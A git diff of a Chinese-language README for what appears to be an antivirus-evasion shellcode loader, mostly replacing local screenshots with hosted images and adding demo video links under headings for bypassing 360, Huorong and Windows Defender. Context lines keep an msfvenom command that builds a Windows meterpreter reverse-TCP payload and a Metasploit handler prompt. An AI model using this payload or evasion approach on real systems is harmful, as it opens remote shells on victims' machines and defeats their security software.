@@ -33,8 +33,6 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.100 lport=8080 -
 
 注意：ShellCode 需要是64位的
 
-![image-20220508135022087](images/%E5%85%8D%E6%9D%80/image-20220508135022087.png)
-
 ![image-20220508135022087](https://user-images.githubusercontent.com/34683107/167286509-b134001a-e463-495c-ab6b-78933050b14f.png)
 ## 加载器
 
@@ -44,11 +42,12 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.100 lport=8080 -
 
 示例：
 
-![](images/%E5%85%8D%E6%9D%80/image-20220508134821387.png)
+![image-20220508134821387](https://user-images.githubusercontent.com/34683107/167286553-0367af02-f64d-4e28-8b01-3080ae98c13f.png)
+
 
 最终格式：
 
-![](images/%E5%85%8D%E6%9D%80/image-20220508135655093.png)
+![image-20220508135655093](https://user-images.githubusercontent.com/34683107/167286556-9b847ebb-0408-43f6-836c-3ac7fac46788.png)
 
 
 
@@ -79,21 +78,19 @@ msf6 exploit(multi/handler) > run
 ### Bypass_360
 
 
-
-
+https://user-images.githubusercontent.com/34683107/167286823-a93fdd69-547e-4adc-9ae5-171fb0e919ca.mov
 
 
 ### Bypass_火绒
 
-
+https://user-images.githubusercontent.com/34683107/167286897-a482c486-c3e9-4f69-ae55-98afd2ff1ed7.mov
 
 
 ### Bypass_Window Defender
 
-
-
+https://user-images.githubusercontent.com/34683107/167286874-9413611e-c2be-4cfb-ba51-f95ebe5518af.mov
 
 
 感谢阅读
-![Axx8](https://user-images.githubusercontent.com/34683107/167286522-4a5fb52c-f975-4ca1-ba6d-6333fd9ff046.jpg)
 
+![Axx8](https://user-images.githubusercontent.com/34683107/167286522-4a5fb52c-f975-4ca1-ba6d-6333fd9ff046.jpg)
